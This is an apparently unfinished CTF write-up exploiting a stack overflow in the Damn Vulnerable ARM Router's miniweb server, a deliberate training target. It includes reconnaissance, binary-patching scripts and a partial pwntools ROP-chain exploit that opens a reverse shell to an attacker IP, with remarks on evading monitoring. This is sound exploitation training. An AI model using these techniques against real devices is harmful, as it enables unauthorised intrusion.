+++
title = "PWN: Exploiting Vulnerable ARM Router"
date = "2024-11-19T16:55:56+01:00"
author = "yocvito"
authorTwitter = "yocvito" #do not include @
cover = ""
tags = ["write-up", "pwn", "arm"]
keywords = ["write-up", "pwn", "arm"]
description = "A write-up for the Damn Vulnerable ARM Router CTF"
showFullContent = false
readingTime = false
hideComments = false
toc = true
+++

# Damn Vulnerable ARM Router

_**This write-up is WIP**_

In this blog post, we will practice ARM exploitation by solving the [**Damn Vulnerable ARM Router** challenge](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html). As its name suggests, it is an ARM Linux running a vulnerable Web server, and we want to get control of the device.

## Rules

> Using your host computer's browser, navigate to the URL and follow the instructions and clues. The virtual network adapter is set to NAT mode.
> Your goal is to write a working stack overflow exploit for the web server running on the DVAR tinysploitARM target. It also includes a bonus challenge.

There is not a lot of explicit instructions and rules for this challenge, so I added the following constraints:
- Don't use the docker shell, except for debugging purposes (identify subnet ip, see logs, etc...)
- If possible, the firmware binaries need to be retrieved by interacting with the web services.


## Recon

### Discovery

First, we enumerate the remote host in order to find opened network services (and spot web related services).

The firmware is running inside a docker, emulated by `qemu-arm`. The docker IP is `172.17.0.3` but the DVAR device is internally connected to the `192.168.100.0/24` network. 

We cannot communicate with the internal network by default:

```bash
$ ping 192.168.100.2
PING 192.168.100.2 (192.168.100.2) 56(84) bytes of data.
From 192.168.1.254 icmp_seq=1 Destination Host Unreachable
From 192.168.1.254 icmp_seq=2 Destination Host Unreachable
^C
--- 192.168.100.2 ping statistics ---
2 packets transmitted, 0 received, +2 errors, 100% packet loss, time 1002ms
```

We need to add a route to the network using the docker container ip.

```bash
sudo ip route add 192.168.100.0/24 via 172.17.0.3
```

We are now able to communicate with the device.

```bash
$ ping 192.168.100.2
PING 192.168.100.2 (192.168.100.2) 56(84) bytes of data.
64 bytes from 192.168.100.2: icmp_seq=1 ttl=63 time=0.463 ms
64 bytes from 192.168.100.2: icmp_seq=2 ttl=63 time=0.439 ms
^C
--- 192.168.100.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1023ms
rtt min/avg/max/mdev = 0.439/0.451/0.463/0.012 ms
```

Performing stealthy (a bit) network port scanning:
```bash
$ sudo nmap -sS -T4 -p- 192.168.100.2 -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2024-11-20 14:14 CET
Nmap scan report for 192.168.100.2
Host is up (0.0019s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
8080/tcp  open  http-proxy
22222/tcp open  easyengine

Nmap done: 1 IP address (1 host up) scanned in 6.20 seconds
```

Try retrieving version of known services:
```bash
$ nmap -sV -p80,8080,22222 192.168.100.2 -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2024-11-20 14:42 CET
Nmap scan report for 192.168.100.2
Host is up (0.00065s latency).

PORT      STATE SERVICE    VERSION
80/tcp    open  http       EXPLOITLAB/2.0
8080/tcp  open  http-proxy
22222/tcp open  ssh        Dropbear sshd 2020.81 (protocol 2.0)
```
2 interesting web services at `80` and `8080`, respectively a **light control system** and the **administration website** of the router. The `ssh` service doesn't seems of interest as it's running a Dropbear ssh daemon version which does not have known exploits.

_We assume extended scanning have been conducted to be sure there was no additional network services behind a simple firewall (FIN scan, ACK scan, ...)._

### Investigating web services

We will now analyze the web services by hand. The goal is to find where we can interact with the server, how it is done, what type of data we can send, and if we can exploit it. 

In parallel, we run web enumeration tools to find other endpoints on the services. (_Might be dangerous because it could trigger alerts_)



#### Lights Control website

##### Web enum 

```bash
# bruteforce router administration website
# - recursively scan from root
# - use common.txt wordlist
ffuf -r -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
    -u http://192.168.100.2:8080/FUZZ -noninteractive
```

It doesn't find anything interesting except the `index.html`

##### Manual investigation

![Lights Controll website](/img/dvar/lights_ctrl.png)

2 buttons allowing to switch the state and picture displayed.
The bottom right logo is not clickable

###### Source code

The webpage source code is quite simple. It just ships a `js` script for modifying state and picture, and the html code.

```HTML
<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
<!-- (c) THE ARM EXPLOIT LABORATORY, Saumil Shah @therealsaumil -->
<html>
<head>
    <link rel="stylesheet" type="text/css" href="styles.css">
    <title>Lights Control</title>
    <script>
    var xhr, img;

    function init()
    {
       xhr = createXHR();
       img = document.getElementById("signal");
    }

    function lights(state)
    {
       xhr.open("GET", "lights/" + state, true);
       xhr.onreadystatechange = function() { handleresponse(xhr); };
       xhr.send(null);
       return;
    }

    function handleresponse(xhr)
    {
       if(xhr.readyState == 4 && xhr.status == 200) {
          if(xhr.responseText == "ON") {
             img.src = "walk.png";
          }
          else {
             img.src = "dont_walk.png";
          }
       }
    }

    function createXHR()
    {
       try { return new XMLHttpRequest(); } catch(e) {}
       try { return new ActiveXObject("Msxml2.XMLHTTP.6.0"); } catch (e) {}
       try { return new ActiveXObject("Msxml2.XMLHTTP.3.0"); } catch (e) {}
       try { return new ActiveXObject("Msxml2.XMLHTTP"); } catch (e) {}
       try { return new ActiveXObject("Microsoft.XMLHTTP"); } catch (e) {}

       return null;
    }
    </script>
</head>
<body onload="init()" class="centrebody">
    <img class="bottomright" src="r0.png">
    <h1>Lights Control</h1>
    <div>
        <img id="signal" src="dont_walk.png">
    </div>
    <div>
        <button class="button-red" onclick="lights('off');">DONT<br>WALK</button> 
        <button class="button-green" onclick="lights('on');">&nbsp;<br>WALK</button> 
    </div>
</body>
</html>
```

The code showcase that **no fancy frontend frameworks are used**, only custom html/css/js code. The **server might also be a custom implementation** because it remains very simple in the way it handles api calls and returns results. We will try later to retrieve the binary running this service in order to find a vuln.

_We could try to exploit common web vulnerabilities to try to leak sensitive informations or exploit it. But as the challenge is about binary exploitation, it's unlikely we have to do that._

#### Router Administration website 

##### Web enum
```bash
# bruteforce router administration website
# - filter response size equals to 300 (the webserver 
#   returns a 200 error code with custom message on 
#   non existing endpoint)
ffuf -r -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://192.168.100.2:80/FUZZ -noninteractive -fs 300
```

Result:
```bash

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.2:80/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,5
00
 :: Filter           : Response size: 300
________________________________________________

cgi-bin/                [Status: 200, Size: 278, Words: 17, Lines: 13, Duration: 2072ms]
cgi-bin2                [Status: 200, Size: 278, Words: 17, Lines: 13, Duration: 2148ms]
cgi-bin                 [Status: 200, Size: 278, Words: 17, Lines: 13, Duration: 2032ms]
index.html              [Status: 200, Size: 67448, Words: 12624, Lines: 1291, Duration: 2022ms]
```

Enumeration showcase the use of `cgi-bin` by the server. 

As stated in [cgi-bin wikipedia page](https://en.wikipedia.org/wiki/Common_Gateway_Interface), when the use try to access a `.cgi` file under `cgi-bin/` directory, the server will try to execute the cgi script.



##### Manual investigation

![Router Admin website](/img/dvar/admin_router.png)

The webpage allows to configure the router. The configuration page has 2 main sections, `Setup` and `Status`, respectively allowing to configure internet and local network, and displays router and configuration informations (firmware version, network information, ...).

The `Setup` section allows:
- _Internet Setup_
    - Internet connection type: `DHCP`, `Static IP`, `PPPoE`, `PPTP`, `L2TP`, `Lestra Cable`
- _Network Setup_
    - Set Router IP (address & mask)
    - Set Router DNS
    - Timezone

I tried to set up some arbitrary values and hit `Save Settings`. It fails saying connection was reset, likely indicating the server has closed the socket, or maybe crashed ? However, we can notice that the server is still responsive if we go back to default page.

We keep the url that led to this behavior:
```url
http://192.168.100.2/basic.html?dhcp_end=149&oldMtu=1500&oldLanSubnet=0&OldWanMode=0&SDHCP1=192&SDHCP2=168&SDHCP3=1&SDHCP4=100&EDHCP1=192&EDHCP2=168&EDHCP3=1&EDHCP4=150&pd=&now_proto=dhcp&old_domain=&chg_lanip=192.168.1.254&_daylight_time=0&wan_proto=0&router_name=DVAR&wan_hostname=&wan_domain=&mtu_enable=0&lan_ipaddr_0=192&lan_ipaddr_1=168&lan_ipaddr_2=1&lan_ipaddr_3=254&lan_netmask=0&lan_proto=Enable&dhcp_start=100&dhcp_num=50&dhcp_lease=0&dns0_0=0&dns0_1=0&dns0_2=0&dns0_3=0&dns1_0=0&dns1_1=0&dns1_2=0&dns1_3=0&dns2_0=0&dns2_1=0&dns2_2=0&dns2_3=0&wins_0=0&wins_1=0&wins_2=0&wins_3=0&time_zone=%28GMT%2B05%3A30%29+Bombay%2C+Calcutta%2C+Madras%2C+New+Delhi&layout=en
```

From here, we could guess that the server crash due to (might be other valid reasons):
- invalid handling of GET params (after `?`)
- buffer overflow on url (without proper validation of the url size on server side)

We could try to send a GET request with a long dummy url like `/AAAAAAAAAAAAAAA...` and see if the server still crash.

![server crash confirmation](/img/dvar/server-crash-confirm.png)

Then with burpsuite, we can automate the process of finding the url size that triggers the crash. We enable proxy mode in burp, send a dummy GET request, and forward it to intruder. In `Payloads` tab of intruder, I figured out we could use `Character blocks` as payload type and set the step to 1 to accurately search for the crashy url size (range 50-300).


![size of url crashing the server](/img/dvar/burpsuite-intruder-attack-url-length-crash.png)

There is no apparent possibilities to trick the webserver and download the firmware. Thus, we will assume the firmware and it's filesystem have been succesfully retrieved by our red team operators (by some means we don't care about here).

_In the case where we can't retrieve the firmware but we know it's an arm linux and guess it's running with no PIE, no ASLR, no NX, and we also know the server respawn the process infinetely (as we saw), then we could spray the stack with nops and a shellcode, and try to bruteforce the return address offset and shellcode nop-land adress range. But it's not really straightforward._

### white-box

access to root-fs

Look the init script at `/etc/rc.local`:
```plaintext
echo '*** starting ***'
/usr/bin/miniweb
/usr/bin/lightsrv &
exit 0
```

Need to reverse these binaries, understand the network services they are related to, map out website actions to code in binaries, find vulns & exploit.

We can find the configuration file for the miniweb server at `/etc/miniweb.conf`:
```plaintext
ServerType Standalone
ServerPort 80
ServerRoot /www
DocumentRoot /www/htdocs
DefaultPage index.html
CgiBinDir /cgi-bin
CgiBinRoot /www/cgi-bin
```

So `miniweb` is the router administration website. It is the main challenge of DVAR so we will first try to pwn this service before moving on to lights control website.

#### miniweb

We saw earlier that the router administration website allows the user to configure a lot of options. **Sadly, the server crashes when we try to save our changes :(**

##### Reversing the binary

###### First pass 

We first conduct a fast analysis of the binary to identify the logic and map binary code attached to a particular action in the website.

main setup server listenning on `SERVERPORT` port value (default is port 80), put server process to background and wait for connection. On client connect, it calls `serveconnection` with the client socket as only argument. 

In `serveconnection`:
1. Read the client request
2. Parse the first line of the request to extract method, url, and eventually params
3. Continue if method is `GET`
4. 

###### Finding the vuln

todo



###### Debug miniweb binary

Binary try to bind to port `80`. Use following script to patch the binary `SERVERPORT` global variable. We also extend the script capabilities to be able to patch some code in the binary.
```python
#!/usr/bin/env python3

import argparse
import lief

NOP_VALUE_ARM32 = b'\x00\x00\xA0\xE1'

def parse_int(s):
    return int(s, 0)


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="Patch an ELF file")

    subcommands = parser.add_subparsers(dest="command")

    network = subcommands.add_parser("network")
    network.add_argument("port", type=parse_int, help="Port number to write to file (will patch SERVERPORT global)")

    nop = subcommands.add_parser("nop")
    nop.add_argument('address', type=parse_int, help='Address to patch')
    nop.add_argument('size', type=parse_int, help='Number of bytes to patch')

    patch = subcommands.add_parser("patch")
    patch.add_argument('address', type=parse_int, help='Address to patch')
    patch.add_argument('value', type=bytes.fromhex, help='Value to patch (as hexstring)')

    parser.add_argument("-f", "--elf", type=str, required=True, help="Path to the ELF file")

    args = parser.parse_args()

    elf = lief.parse(args.elf)

    if args.command == "network":

        sym = elf.get_symbol("SERVERPORT")

        sym_vaddr= sym.value
        print('@SERVERPORT =', hex(sym_vaddr))

        section = elf.section_from_virtual_address(sym_vaddr)
        if not section:
            print(f"Could not find the section containing the symbol '{symbol_name}'.")
            exit(1)

        sym_sec_offset = sym_vaddr - section.virtual_address
        binary_data = bytearray(section.content)
        orig_port = int.from_bytes(binary_data[sym_sec_offset:sym_sec_offset+4], 'little')

        print("Original port:", orig_port)
        print("New port:", args.port)

        binary_data[sym_sec_offset:sym_sec_offset+4] = args.port.to_bytes(4, 'little')   
        section.content = binary_data

    elif args.command in ["nop", "patch"]:

        section = elf.section_from_virtual_address(args.address)
        if not section:
            print(f"Could not find the section containing the address {args.address}.")
            exit(1)

        sym_sec_offset = args.address - section.virtual_address
        binary_data = bytearray(section.content)

        size = args.size if args.command == "nop" else len(args.value)

        print("[orignal content]\n" + section.content[sym_sec_offset:sym_sec_offset+size].hex())
    
        if args.command == "patch":
            binary_data[sym_sec_offset:sym_sec_offset+size] = args.value

        elif args.command == "nop":
            if args.size % 4 != 0:
                print('Unaligned size detected (must be 4 bytes aligned for arm32)\n\t=> discarding last ' + args.size % 4 + ' bytes')
            num_nops = args.size // 4

            binary_data[sym_sec_offset:sym_sec_offset+(num_nops*4)] = NOP_VALUE_ARM32 * num_nops

        section.content = binary_data

        pass
    else:
        args.print_help()
        exit(1)

    outfile = args.elf + ".patched"
    elf.write(outfile)

    print('Patched file written to', outfile)

```

Now we want a way to perform dynamic analysis the binary. We will use `qemu` and `gdb`, and read the [azeria labs tutorial](https://azeria-labs.com/arm-on-x86-qemu-user/) for emulating and debugging arm32 binaries.

To emulate the binary and debug it with `gdb`, you first use `qemu-arm` to emulate the binary and open a gdb server on a specified port:

```bash
# retrieves the rootfs from emux DVAR files
qemu-arm -g 1234 -L path/to/rootfs-arm \
    -B 0x10000 ./miniweb.patched
```

Then connect to the gdb server with `gdb-multiarch` in another terminal:

```bash
gdb-multiarch -q -nh -ex 'set architecture arm' \
                        -ex 'file ./miniweb.patched' \
                        -ex 'target remote localhost:1234' \
                        -ex 'layout split' -ex 'layout regs' \
                        -ex 'set solib-search-path ./rootfs-arm/lib' \
                        -ex 'set follow-fork-mode child' \
                        -ex 'set detach-on-fork off' 
```

Try to `continue` the process in gdb to see there is still some caveats for debugging the binary:
- `SERVERPORT` is overwritten by `readinconfig` (by reading its value from `/etc/miniweb.conf`)
- gdb doesn't follows child on `fork()`, nor stops parent after the call.

So we are quite fucked trying to debug this binary. We have many options to temper with this (make parent & child stop after fork with breakpoint + attach to child, patch the binary to remove related code parts, ...)

I decided to create a patch of the binary that I can easely debug. We will be using previous python script to do so. We create a `patch.sh` file with following content:
```bash
#!/bin/bash

FILEPATH=$1
FILEPATH_TMP=${FILEPATH}.tmp
ROOTFS=$2


function patch_file() {
	python3 miniweb_patch.py $@
	mv "${FILEPATH_TMP}.patched" $FILEPATH_TMP 
}

if [[ $# -lt 2 ]]; then
	echo "[patch.sh] Usage: $0 <file-to-patch> <rootfs-path>"
	exit 1
fi

cp $FILEPATH $FILEPATH_TMP
# Change SERVERPORT to 4444 (not really 
# needed anymore as we modify config file)
patch_file -f $FILEPATH_TMP network 4444 
echo "[patch.sh] overwritting server port in 'miniweb.conf'"
sed -i 's/80/4444/g' $ROOTFS/etc/miniweb.conf
# Nop forking process to background
patch_file -f $FILEPATH_TMP nop 0x111F4 0x4c
# Nop forking process to handle client
patch_file -f $FILEPATH_TMP nop 0x112AC 0x8
# Patch check on fork() output
patch_file -f $FILEPATH_TMP patch 0x112B4 000050e1

mv $FILEPATH_TMP "${FILEPATH}.patched"

echo "[patch.sh] Patched file written to ${FILEPATH}.patched"
```

Then makes the script executable and run it:
```bash
chmod +x patch.sh
./patch.sh ./miniweb ./rootfs-arm
```

This should generate a `miniweb.patched` file that we can debug with gdb. First, we can try to send the specific HTTP request we found earlier, and which presumably crash the server. We run the binary with qemu (without starting gdb server) and send the request using curl:

```bash
qemu-arm -L ./rootfs-arm \
           -B 0x10000 ./miniweb.patched
```

In another terminal send the buggy HTTP request:
```bash
curl 'http://localhost:4444/basic.html?dhcp_end=149&oldMtu=1500&oldLanSubnet=0&OldWanMode=0&SDHCP1=192&SDHCP2=168&SDHCP3=1&SDHCP4=100&EDHCP1=192&EDHCP2=168&EDHCP3=1&EDHCP4=150&pd=&now_proto=dhcp&old_domain=&chg_lanip=192.168.1.254&_daylight_time=0&wan_proto=0&router_name=DVAR&wan_hostname=&wan_domain=&mtu_enable=0&lan_ipaddr_0=192&lan_ipaddr_1=168&lan_ipaddr_2=1&lan_ipaddr_3=254&lan_netmask=0&lan_proto=Enable&dhcp_start=100&dhcp_num=50&dhcp_lease=0&dns0_0=0&dns0_1=0&dns0_2=0&dns0_3=0&dns1_0=0&dns1_1=0&dns1_2=0&dns1_3=0&dns2_0=0&dns2_1=0&dns2_2=0&dns2_3=0&wins_0=0&wins_1=0&wins_2=0&wins_3=0&time_zone=%28GMT%2B05%3A30%29+Bombay%2C+Calcutta%2C+Madras%2C+New+Delhi&layout=en'
```

In the `qemu-arm` terminal, you should see the message `qemu: uncaught target signal 11 (Segmentation fault) - core dumped` indicating a crash of the server. In reality, it's the child process handling the client which crashes. It means the server will remain functional and not block while we exploit the vuln.

##### Exploitation

We will try to exploit this server using only ROPs :) 

Funny, but quite a mess lmao.


```python
from pwn import *
req = b'GET /basic.html?' + cyclic(500, n=4) + b' HTTP/1.1\r\n'
req += b'Host: 192.168.100.2\r\n\r\n'
open('request.txt', 'wb+').write(req)
```

```bash
socat file:./request.txt tcp:localhost:4444
```

![crash with cyclic](/img/dvar/crash-with-cyclic.png)

```python
In [1]: from pwn import *
In [2]: cyclic_find(0x6461616a, n=4)
Out[2]: 336
```

So we know how far is the return address from our buffer start. Now, we need to retrieve useful gadgets and functions in the binary and shared libraries shipped in rootfs. These gadgets should allow us to spawn a shell, typically by calling `system` function or `exec*` like syscalls. 

One remaining issue is that the process (`/bin/sh`) would have its file descriptors inherited from its father, and in our case it means we won't be able to interact with the spawned shell. 

To tamper with this, we could write a ROP-chain that achieves a complete reverse shell onto attacker machine, or just `dup2` the already opened client socket file descriptor to overwrite `STDIN`, `STDOUT`, `STDERR`. The ROP-chain would finally performs following calls:
```C
// in case of complete reverse shell,
// we prepend following code to ROP-chain
csock = socket(AF_INET, SOCK_STREAM, 0);
connect(csock, (struct sockaddr *)&sin, sizeof(sin));   // where sin is written on stack
                                                        // and contains data for connecting 
                                                        // to attacker
// base ROP-chain
dup2(csock, 0);
dup2(csock, 1);
dup2(csock, 2);
system("/bin/sh");
```

Using the already allocated socket would be very cool. **It allows stealthy exploitation by using an already allocated connection, which has been created by a normal behavior of the server**. It would have been stealthier than creating a new socket, which can be seen with tools like `ss`, or even be trapped by software monitoring network connections.

What harden the difficulty for exploiting this way is the unpredictability of the `csock` file descriptor. Indeed, `accept` could have been called many times before we try to exploit and if for some reason file descriptors hasn't been released by the kernel, then we would not be able to predict `csock` value.

Plan:
1. set `r0` to `2`
2. set `r1` to `1`
3. set `r2` to `0`
4. **call `socket`**
5. save `r0` value somewhere
6. set `r0` to `csock` (result of socket is already in `r0`, so nothing to do) 
7. set `r1` to `sin` (located inside function frame)
8. set `r2` to `16` (equals to `sizeof(struct sockaddr_in)`)
9. **call `connect`**
10. set `r0` to `csock`
11. set `r1` to `0`
12. **call `dup2`**
13. set `r0` to `csock`
14. set `r1` to `1`
15. **call `dup2`**
16. set `r0` to `csock`
17. set `r1` to `2`
18. **call `dup2`**
19. set `r0` to `"/bin/sh"`
20. **call `system`**

| step | description | gadget | file offset | virtual address |
|------|-------------|--------|-------------|-----------------|
| `1` | set `r0` to `2` | `mov r0, #0 ; pop {r7, pc}`, `add r0, r0, #2 ; pop {r4, pc}`  | `0x0000eef0`, `0x000300f4`  | |
| `2` | set `r1` to `1` | `mov r1, #0 ; mov r0, r1 ; pop {r4, r5, r6, pc}`, `add r1, r1, #1 ; cmp r0, #0 ; bne #0x30578 ; pop {r4, pc}` | `0x0003a6d8`, `0x000305a8` | |
| `3` | set `r2` to `0` | `mov r2, #0 ; str r2, [r3] ; pop {r4, pc}` | `0x00030d30` | |
| `5` | save `r0` value somewhere | `pop {r4, pc}`, `str r0, [r4] ; pop {r4, pc}` | `0x0000bac4`, `0x0002ae30` | |
| `6` | set `r0` to `csock` | nothing to do | | | 
| `7` | set `r1` to `sin` | `pop {r1, r2, r3, pc}` | `0x000129e4` | |
| `8` | set `r2` to `16` | `pop {r1, r2, r3, pc}`, `add r2, r2, #1 ; str r2, [r0, #0x50] ; mov r0, r3 ; pop {r4, pc}` | `0x000129e4`, `0x00029110` | |
| `10` | set `r0` to `csock` |`pop {r4, pc}`, `ldr r0, [r4] ; pop {r4, r5, r6, pc}` | `0x0000bac4`, `0x0001b714` | |
| `11` | set `r1` to `0` | `mov r1, #0 ; mov r0, r1 ; pop {r4, r5, r6, pc}` | `0x0003a6d8` | |
| `10` | set `r0` to `csock` |`pop {r4, pc}`, `ldr r0, [r4] ; pop {r4, r5, r6, pc}` | `0x0000bac4`, `0x0001b714` | |
| `14` | set `r1` to `1` |`mov r1, #0 ; mov r0, r1 ; pop {r4, r5, r6, pc}` | `0x0003a6d8` | | 
| `10` | set `r0` to `csock` |`pop {r4, pc}`, `ldr r0, [r4] ; pop {r4, r5, r6, pc}` | `0x0000bac4`, `0x0001b714` | |
| `17` | set `r1` to `2` | `mov r1, #0 ; mov r0, r1 ; pop {r4, r5, r6, pc}` | `0x0003a6d8` | |
| `19` | set `r0` to `"/bin/sh"` | `pop {r4, pc}`, `mov r0, r4 ; pop {r4, pc}`  | `0x0000bac4`, `0x00015ed8`  | |

Additional gadgets:
- `0x00016298 : pop {r3, pc}`


We need:
- address of `"/bin/sh"` string => `0xff77d080`
- address of `system` function (or PLT trampoline) => `0x10ca8`
- address of a gadget allowing to set `r0` to `"/bin/sh"` string (typically one writing r0 with a value from stack)
    - `0x00015ed8 : mov r0, r4 ; pop {r4, pc}` => `0xff74ced8`
    - `0x0000bac4 : pop {r4, pc}` => `0xff742ac4`
- address of gadgets allowing to exec `dup2(csock, 0); dup2(csock, 1); dup2(csock, 2)`
    - `0x0000eef0 : mov r0, #0 ; pop {r7, pc}` => `0xff745ef0`
    - `0x000305a8 : add r1, r1, #1 ; cmp r0, #0 ; bne #0x30578 ; pop {r4, pc}` => `0xff7675a8`
        - usefull to increment r1 to reach `csock`
    - `0x0001f500 : mov r0, #1 ; pop {r4, pc}` => `0xff756500`
    - `0x00030b48 : add r1, r1, #1 ; bne #0x30b08 ; pop {r4, r5, pc}` => `0xff767b48`
        - usefull to increment r1 to reach `csock` (when `r0=1`)
    - `0x000129e4 : pop {r1, r2, r3, pc}` => `0xff7499e4`
    - `0x000300f4 : add r0, r0, #2 ; pop {r4, pc}` => `0xff7670f4`
    - `0x00030d30 : mov r2, #0 ; str r2, [r3] ; pop {r4, pc}` => `0xff767d30`






Our payload is prepended by `"Connection from %s, request = \"GET `, where the string format `%s` is replaced with the remote IP (`172.17.0.1`), and with a timestamp if we have to use the upper stack buffer for overflowing the stack (in case we send too much bytes).

Exploit with following script in local:
```python
#!/usr/bin/env python3

from pwn import *
import argparse
import os
import struct
import socket
from urllib.parse import quote_plus as urlencode
import threading

context.arch = 'arm'
context.bits = 32
context.endian = 'little'
context.log_level = 'error'

# Base address
base_address = 0xff737000 # (local) 0x40000000  # 0xff737000 

# Calculating virtual addresses
g_pop_r4_ea = base_address + 0x0000bac4  # null
g_mov_r0_r4_ea = base_address + 0x00015ed8
g_ldr_r0_r4_ea = base_address + 0x0001b714
g_mov_r0_0_ea = base_address + 0x0000eef0 # null 
g_pop_r1_ea = base_address + 0x000129e4
g_add_r0_2_ea = base_address + 0x000300f4 # null
g_add_r1_1_ea = base_address + 0x00030b48
g_add_r1_1_with_cmp_ea = base_address + 0x000305a8

g_mov_r1_0_ea = base_address + 0x0003a6d8
g_add_r1_1_with_r0_cmp_ea = base_address + 0x000305a8
g_add_r0_2_ea = base_address + 0x000300f4
g_mov_r2_0_ea = base_address + 0x00030d30
g_str_r0_r4_ea = base_address + 0x0002ae30
g_pop_r4_r6_r7_ea = base_address + 0x0001f3d8 
g_pop_r1_r2_r3_ea = base_address + 0x000129e4
g_pop_r3_ea = base_address + 0x00016298
g_add_r2_1_ea = base_address + 0x00029110
g_strb_r0_r4_ea = base_address + 0x0003a4a4 

dup2_ea = base_address + 0xb328 + 4 # +4 to skip PUSH {R7, LR} # null
binsh_ea = base_address + 0x46080 
system_ea = base_address + 0x438dc + 4 
socket_ea = base_address + 0x3a240 + 4 
connect_ea = base_address + 0x39bd8 + 4
exit_ea = base_address + 0x3f2dc + 4
execve_stub_ea = base_address + 0x43584 

stack_buf_data_start = 0xfffeae10
stack_sin_ea = stack_buf_data_start + 0x10   # 0xfffeae20
stack_dummy_ea = stack_buf_data_start 
stack_csock_ea = stack_buf_data_start + 0x24


HOST = ('192.168.100.2', 80)

def parse_host(host):
    try:
        ip, port = host.split(":")
    except:
        raise argparse.ArgumentTypeError("host must be in format <ip>:<port>")
    return (ip, int(port))


def check_null_bytes(data):
    if b'\x00' in data:
        from termcolor import colored
        print("payload contains null bytes")
        print("[payload]\n")
        payload = 'ff' + data.hex()
        # chunk by byte (2 characters) and iterate
        for i in range(0, len(payload), 2):
            if i != 0 and (i % (4*2)) == 0:
                print()
            if payload[i:i+2] == '00':
                print(colored(payload[i:i+2], 'red'), end='')
            else:
                print(payload[i:i+2], end='')
        print()
        return True
    return False 


def _send_delayed_routine(p, data, delay=1.0):
    time.sleep(delay)
    print(f"Sending {len(data)} bytes")
    p.send(data)

def send_delayed(p, data, delay=1.0):
    thread = threading.Thread(target=_send_delayed_routine, args=(p,data, delay,))
    thread.start()
    return thread

    


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="Exploit for DVAR")

    subparsers = parser.add_subparsers(dest="command")
    
    miniweb_parser = subparsers.add_parser("miniweb", help="Run miniweb")

    parser.add_argument("-H", "--host", type=parse_host, default=HOST, required=True, help="Target host (format = <ip>:<port>)")

    parser.add_argument("-l", "--listen", type=int, default=1337, help="Port to listen on for reverse shell connection")
    
    args = parser.parse_args()

    p = remote(args.host[0], args.host[1])
    
    if args.command == "miniweb":

        variables = {
            "g_pop_r4": g_pop_r4_ea,
            "g_mov_r0_r4": g_mov_r0_r4_ea,
            "g_ldr_r0_r4": g_ldr_r0_r4_ea,
            "g_mov_r0_0": g_mov_r0_0_ea,
            "g_pop_r1": g_pop_r1_ea,
            "g_add_r0_2": g_add_r0_2_ea,
            "g_add_r1_1": g_add_r1_1_ea,
            "g_add_r1_1_with_cmp": g_add_r1_1_with_cmp_ea,
            "g_mov_r1_0": g_mov_r1_0_ea,
            "g_add_r1_1_with_r0_cmp": g_add_r1_1_with_r0_cmp_ea,
            "g_mov_r2_0": g_mov_r2_0_ea,
            "g_str_r0_r4": g_str_r0_r4_ea,
            "g_pop_r1_r2_r3": g_pop_r1_r2_r3_ea,
            "g_pop_r3": g_pop_r3_ea,
            "g_add_r2_1": g_add_r2_1_ea,
            "g_strb_r0_r4": g_strb_r0_r4_ea
        }

        print('[gadgets]')
        for name, virt_addr in variables.items():
            print(f"{name} = {hex(virt_addr)} ({hex(virt_addr - base_address)})")

        print('[variables]')
        print('@dummy = ', hex(stack_dummy_ea))
        print('@csock = ', hex(stack_csock_ea))
        print('@sin =   ', hex(stack_sin_ea))
    

        print('[funcs]')
        print('@system = ', hex(system_ea))
        print('@binsh =  ', hex(binsh_ea))
        print('@dup2 =   ', hex(dup2_ea))
        print('@socket = ', hex(socket_ea))
        print('@connect =', hex(connect_ea))
        print('@exit =   ', hex(exit_ea))
        print('@execve = ', hex(execve_stub_ea))
        

        sin_family = 0xff02 
        sin_port = socket.htons(args.listen) 
        sin_addr = socket.inet_aton("192.168.1.156")
        sin_zero = b'\x01' * 8

        sin = struct.pack('<HH', sin_family, sin_port) + sin_addr + sin_zero
        print(sin)

        
        payload = b'A' * 299 # 173

        # data area
        payload += b'x' * 0x14  
        payload += sin
        payload += b'x' * 12 

        # reached @ret
        payload += p32(g_mov_r1_0_ea) # also set r0 to 0
        payload += b'B'*16
        payload += p32(0xdeadbeef) # r4
        payload += p32(0xdeadbeef) # r5
        payload += p32(0xdeadbeef) # r6
        payload += p32(g_add_r1_1_with_r0_cmp_ea)
        payload += p32(0xdeadbeef) # r4
        payload += p32(g_add_r0_2_ea)
        payload += p32(0xdeadbeef) # r4
        payload += p32(g_pop_r3_ea)
        payload += p32(stack_dummy_ea) # r3
        payload += p32(g_mov_r2_0_ea)
        payload += p32(0xdeadbeef) # r4
        payload += p32(socket_ea) # csock = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
                                  # (will pop {r7, pc})
        payload += p32(0xdeadbeef) # r7
        payload += p32(g_pop_r4_ea)
        payload += p32(stack_csock_ea) # r4
        payload += p32(g_str_r0_r4_ea)
        # fix struct sockaddr_in
        payload += p32(stack_sin_ea+1) # r4
        payload += p32(g_mov_r0_0_ea)
        payload += p32(0xdeadbeef) # r7
        payload += p32(g_strb_r0_r4_ea)
        payload += p32(stack_sin_ea+8) # r4
        payload += p32(g_str_r0_r4_ea)
        payload += p32(stack_sin_ea+12) # r4
        payload += p32(g_str_r0_r4_ea)
        # prepare args in regs
        payload += p32(stack_csock_ea) # r4
        payload += p32(g_pop_r1_r2_r3_ea)
        payload += p32(stack_sin_ea-1) # r1
        payload += p32(0xffffffff) # r2
        payload += p32(stack_dummy_ea) # r3
        payload += p32(g_mov_r0_0_ea)
        payload += p32(0xdeadbeef) # r7
